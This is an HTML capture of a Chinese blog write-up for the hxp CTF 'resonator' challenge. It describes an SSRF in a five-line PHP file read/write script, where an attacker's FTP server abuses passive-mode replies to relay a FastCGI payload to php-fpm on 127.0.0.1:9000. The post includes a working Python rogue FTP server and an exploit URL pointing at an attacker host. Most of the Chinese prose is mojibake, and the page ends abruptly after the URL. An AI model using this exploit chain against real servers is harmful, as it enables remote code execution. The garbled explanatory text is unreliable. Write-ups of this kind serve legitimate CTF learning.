<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>hxp CTF resonator Writeup - SSRF via file_put_contents - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="é¢˜ç›®ç®€ä»‹
åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.
é•¿åº¦åªæœ‰äº”è¡Œ,"><meta property="og:image" content><meta property="og:title" content="hxp CTF resonator Writeup - SSRF via file_put_contents"><meta property="og:description" content="é¢˜ç›®ç®€ä»‹
åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.
é•¿åº¦åªæœ‰äº”è¡Œ,"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-30T15:02:46+00:00"><meta property="article:modified_time" content="2020-12-30T15:02:46+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="hxp CTF resonator Writeup - SSRF via file_put_contents"><meta name=twitter:description content="é¢˜ç›®ç®€ä»‹
åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.
é•¿åº¦åªæœ‰äº”è¡Œ,"><script src=https://rmb122.com/js/feather.min.js></script><link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.e9aac7e7a771269044e258ce034f7420b431b95683d4aef0faa4d381efbb16d3.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.4d342f24ad49bb75f14c3b92c9454fe693d293fb7474ecc40a101a8ad6af9d71.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>é¦–é¡µ</a>&nbsp;
<a href=/posts>å½’æ¡£</a>&nbsp;
<a href=/tags>æ ‡ç­¾</a>&nbsp;
<a href=/links>å‹é“¾</a>&nbsp;
<a href=/about>å…³äº</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a><script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>hxp CTF resonator Writeup - SSRF via file_put_contents</h1><div class=meta>å‘è¡¨äº 2020 å¹´ 12 æœˆ 30 æ—¥</div></div><section class=body><h2 id=é¢˜ç›®ç®€ä»‹>é¢˜ç›®ç®€ä»‹</h2><p>åœ¨åˆšç»“æŸçš„ hxpCTF ä¸­å‡ºç°äº†ä¸€é¢˜è·Ÿ ğŸŠ çš„ One line php challenge ä¸€æ ·çŸ­å°ç²¾æ‚ä½†éå¸¸æœ‰è¶£çš„é¢˜ç›®.
é•¿åº¦åªæœ‰äº”è¡Œ,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#8be9fd;font-style:italic>$file</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>[<span style=color:#f1fa8c>&#39;file&#39;</span>] <span style=color:#ff79c6>??</span> <span style=color:#f1fa8c>&#39;/tmp/file&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>[<span style=color:#f1fa8c>&#39;data&#39;</span>] <span style=color:#ff79c6>??</span> <span style=color:#f1fa8c>&#39;:)&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>file_put_contents(<span style=color:#8be9fd;font-style:italic>$file</span>, <span style=color:#8be9fd;font-style:italic>$data</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#ff79c6>echo</span> file_get_contents(<span style=color:#8be9fd;font-style:italic>$file</span>);
</span></span></code></pre></div><p>ä¹ä¸€çœ‹ä¸æ˜¯ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å’Œå†™äº†ä¹ˆ, æˆ‘ä»¬å†çœ‹çœ‹ä»–çš„ Dockerfile</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>RUN</span> rm -rf /var/www/html/*
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>COPY</span> docker-stuff/default /etc/nginx/sites-enabled/default
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>COPY</span> docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>COPY</span> flag.txt docker-stuff/readflag /
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff79c6>RUN</span> chown 0:1337 /flag.txt /readflag <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c></span>    chmod <span style=color:#bd93f9>040</span> /flag.txt <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c></span>    chmod <span style=color:#bd93f9>2555</span> /readflag
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff79c6>COPY</span> index.php /var/www/html/
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff79c6>RUN</span> chown -R root:root /var/www <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c></span>    find /var/www -type d -exec chmod <span style=color:#bd93f9>555</span> <span style=color:#ff79c6>{}</span> <span style=color:#f1fa8c>\;</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c></span>    find /var/www -type f -exec chmod <span style=color:#bd93f9>444</span> <span style=color:#ff79c6>{}</span> <span style=color:#f1fa8c>\;</span>
</span></span></code></pre></div><p>www.conf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>[www]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#50fa7b>user</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#50fa7b>group</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#50fa7b>listen</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>127.0.0.1:9000</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#50fa7b>listen.owner</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#50fa7b>listen.group</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
</span></span></code></pre></div><p>é¢˜ç›®é™åˆ¶äº† flag å’Œ WEB ç›®å½•çš„æƒé™, æ— æ³•ç›´æ¥è¯» flag å’Œå†™ webshell, éœ€è¦ getshell åè¿è¡Œ readflag æ‰è¡Œ. æ ¹æ® php-fpm ç‰¹æ„è®¾ç½®äº†ç«¯å£ç›‘å¬, å¾ˆå¤§å¯èƒ½å°±æ˜¯éœ€è¦ SSRF fastcgi å getshell.
ä½†è¿™æ ·ä¸€çœ‹, ä¼¼ä¹å°±ç›´æ¥æ— è§£äº†, è™½ç„¶å­˜åœ¨ fastcgi ç›‘å¬åœ¨ 9000 ç«¯å£, ä½†æ˜¯å•å•å‡­å€Ÿ file_get_contents çš„å‡ ä¸ªåè®®, æ— æ³•æ§åˆ¶ä¼ é€’çš„å†…å®¹, php-fpm åœ¨æ”¶åˆ°æ— æ•ˆæ•°æ®åä¼šç›´æ¥ä¸­æ–­é“¾æ¥. å­˜åœ¨å¯èƒ½çš„æ˜¯ file_put_contents, æˆ‘ä»¬å¯ä»¥å®Œæ•´æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°.</p><h2 id=ssrf-via-file_put_contents>SSRF via file_put_contents</h2><p>æ¥ä¸‹æ¥å°±éœ€è¦ä»‹ç»æœ¬ç¯‡æ–‡ç« çš„é‡ç‚¹, é€šè¿‡ file_put_contents æ¥è¾¾åˆ° SSRF ç›®çš„.
æˆ‘ä»¬å…ˆçœ‹çœ‹ php æ‰€æ”¯æŒçš„åè®®</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>file:<span style=color:#ff79c6>//</span> â€” Accessing local filesystem
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>http:<span style=color:#ff79c6>//</span> â€” Accessing HTTP(s) URLs
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>ftp:<span style=color:#ff79c6>//</span> â€” Accessing FTP(s) URLs
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>php:<span style=color:#ff79c6>//</span> â€” Accessing various I<span style=color:#ff79c6>/</span>O streams
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>zlib:<span style=color:#ff79c6>//</span> â€” Compression Streams
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>data:<span style=color:#ff79c6>//</span> â€” Data (RFC <span style=color:#bd93f9>2397</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>glob:<span style=color:#ff79c6>//</span> â€” Find pathnames matching pattern
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>phar:<span style=color:#ff79c6>//</span> â€” PHP Archive
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>ssh2:<span style=color:#ff79c6>//</span> â€” Secure Shell <span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>rar:<span style=color:#ff79c6>//</span> â€” RAR
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>ogg:<span style=color:#ff79c6>//</span> â€” Audio streams
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>expect:<span style=color:#ff79c6>//</span> â€” Process Interaction Streams
</span></span></code></pre></div><p>ssh2, rar, ogg, expect éƒ½éœ€è¦é¢å¤–å®‰è£… PCEL æ‰©å±•, å†æ’é™¤ glob, data, zlib, php è¿™äº›æ˜æ˜¾æ²¡æœ‰å¤ªå¤§æ”»å‡»é¢çš„åè®®. å®é™…ä¸Šæœ‰å¯èƒ½åˆ©ç”¨çš„åè®®åªæœ‰ file, http, ftp, phar è¿™å››ç§.
æ–‡ä»¶ç³»ç»Ÿå±‚é¢çš„æ¼æ´ç”±äºå¤§éƒ¨åˆ†ç›®å½•éƒ½ä¸å¯ä»¥å†™, å¯ä»¥æ’é™¤ file, è€Œ http æ— æ³•ç”¨äº file_put_contents ä¹Ÿå¯ä»¥æ’é™¤. phar æ²¡æœ‰å·²çŸ¥çš„åŸç”Ÿ php åˆ©ç”¨é“¾, åŒæ ·å¯ä»¥æ’é™¤, æœ€åç•™ä¸‹çš„åªæœ‰ ftp åè®®.</p><p>ftp åè®®ç›¸å¯¹æ¯”è¾ƒå¤æ‚, å…¶ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹æ€§, ç›¸ä¿¡å¤§å®¶éƒ½å¬è¯´è¿‡, å°±æ˜¯ ftp çš„æ•°æ®ç«¯å£å’ŒæŒ‡ä»¤ç«¯å£æ˜¯åˆ†å¼€çš„, æˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„ 21 å·ç«¯å£å…¶å®æ˜¯ ftp çš„æŒ‡ä»¤ç«¯å£, ç”¨äºå‘é€æŒ‡ä»¤, æ¯”å¦‚è®¤è¯ç”¨æˆ·å’ŒæŒ‡å®šè¯»å–çš„æ–‡ä»¶. ä½†æ˜¯å¦‚æœæ˜¯ä¼ è¾“æ–‡ä»¶çš„å†…å®¹, ftp å®é™…ä¸Šä¼šé‡æ–°æ‰“å¼€ä¸€ä¸ªé“¾æ¥, åŒæ—¶è¿˜åˆ†ä¸ºä¸¤ç§æ¨¡å¼, è¢«åŠ¨æ¨¡å¼å’Œä¸»åŠ¨æ¨¡å¼.</p><p>è¿™é‡Œ wikipedia è®²çš„æ¯”è¾ƒæ¸…æ¥š, æˆ‘ç›´æ¥å¤åˆ¶ä¸€æ®µè¿‡æ¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>FTPæœ‰ä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼šä¸»åŠ¨å’Œè¢«åŠ¨ã€‚ä¸»åŠ¨æ¨¡å¼è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åŒæ—¶æ‰“å¼€å¹¶ä¸”ç›‘å¬ä¸€ä¸ªç«¯å£ä»¥åˆ›å»ºè¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç”±äºå®‰è£…äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ã€‚æ‰€ä»¥ï¼Œåˆ›ç«‹äº†è¢«åŠ¨æ¨¡å¼ã€‚è¢«åŠ¨æ¨¡å¼åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯å®‰è£…äº†é˜²ç«å¢™çš„é—®é¢˜ã€‚
</span></span></code></pre></div><p>æ³¨æ„ <code>è¢«åŠ¨æ¨¡å¼åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹</code>, è¿™é‡Œæœ‰éå¸¸é‡è¦çš„ä¸€ç‚¹, è¿™ä¸ªè¢«åŠ¨æ¨¡å¼çš„ç«¯å£æ˜¯æœåŠ¡å™¨æŒ‡å®šçš„, è€Œä¸”è¿˜æœ‰ä¸€ç‚¹æ˜¯å¾ˆå¤šåœ°æ–¹æ²¡æœ‰æåˆ°çš„, å®é™…ä¸Šé™¤äº†ç«¯å£, æœåŠ¡å™¨çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥è¢«æŒ‡å®šçš„. ç”±äº ftp å’Œ http ç±»ä¼¼, åè®®å†…å®¹å…¨æ˜¯çº¯æ–‡æœ¬, æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°å®ƒæ˜¯å¦‚ä½•æŒ‡å®šåœ°å€å’Œç«¯å£çš„</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>227 Entering Passive Mode(192,168,9,2,4,8)
</span></span></code></pre></div><p>227 å’Œ Entering Passive Mode ç±»ä¼¼ HTTP çš„çŠ¶æ€ç å’ŒçŠ¶æ€çŸ­è¯­, è€Œ (192,168,9,2,4,8) ä»£è¡¨è®©å®¢æˆ·ç«¯è¿æ¥ 192.168.9.2 çš„ 4 * 256 + 8 = 1032 ç«¯å£.
è¿™æ ·è¿™ä¸ªå¦‚ä½•åˆ©ç”¨å°±å¾ˆæ˜æ˜¾äº†, file_put_contents åœ¨ä½¿ç”¨ ftp åè®®æ—¶, ä¼šå°† data çš„å†…å®¹ä¸Šä¼ åˆ° ftp æœåŠ¡å™¨, ç”±äºä¸Šé¢è¯´çš„ pasv æ¨¡å¼ä¸‹, æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£æ˜¯å¯æ§, æˆ‘ä»¬å¯ä»¥å°†åœ°å€å’Œç«¯å£æŒ‡åˆ° 127.0.0.1:9000. åŒæ—¶ç”±äº ftp çš„ç‰¹æ€§, ä¸ä¼šæœ‰ä»»ä½•çš„å¤šä½™å†…å®¹, ç±»ä¼¼ gopher åè®®, ä¼šå°† data åŸå°ä¸åŠ¨çš„å‘ç»™ 127.0.0.1:9000, å®Œç¾ç¬¦åˆæ”»å‡» fastcgi çš„è¦æ±‚.</p><h2 id=åˆ©ç”¨è„šæœ¬>åˆ©ç”¨è„šæœ¬</h2><p>server.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>import</span> socket
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>import</span> sys
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>Usage: python3 exp.py local_port target_ip target_port
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>lport <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>1</span>])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>raddr <span style=color:#ff79c6>=</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>2</span>]<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#39;.&#39;</span>, <span style=color:#f1fa8c>&#39;,&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>rport <span style=color:#ff79c6>=</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>3</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>server <span style=color:#ff79c6>=</span> socket<span style=color:#ff79c6>.</span>socket()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>server<span style=color:#ff79c6>.</span>bind((<span style=color:#f1fa8c>&#39;0.0.0.0&#39;</span>, lport))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>server<span style=color:#ff79c6>.</span>listen()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>client, _ <span style=color:#ff79c6>=</span> server<span style=color:#ff79c6>.</span>accept()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;220 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;331 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;230 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;220 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;550 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;227 aa (</span><span style=color:#f1fa8c>{</span>raddr<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>,0,</span><span style=color:#f1fa8c>{</span>rport<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>encode()) <span style=color:#6272a4># é»˜è®¤ php ä¼šä½¿ç”¨ EPSV å‘½ä»¤, è¿™ä¸ªåªèƒ½æŒ‡å®šç«¯å£, æ‰€ä»¥æˆ‘ä»¬éœ€è¦å‘é€ä¸¤æ¬¡ 227 è®© php fallback åˆ° PASV æ¨¡å¼</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;227 aa (</span><span style=color:#f1fa8c>{</span>raddr<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>,0,</span><span style=color:#f1fa8c>{</span>rport<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>encode())
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;150 Ok</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>http:<span style=color:#ff79c6>//</span>target:<span style=color:#bd93f9>8009</span><span style=color:#ff79c6>/</span>?file<span style=color:#ff79c6>=</span>ftp:<span style=color:#ff79c6>//</span>your_server:<span style=color:#bd93f9>19133</span><span style=color:#ff79c6>/</span>anything<span style=color:#ff79c6>&amp;</span>data<span style=color:#ff79c6>=</span>{Gopherus ç”Ÿæˆçš„ fastcgi payload}
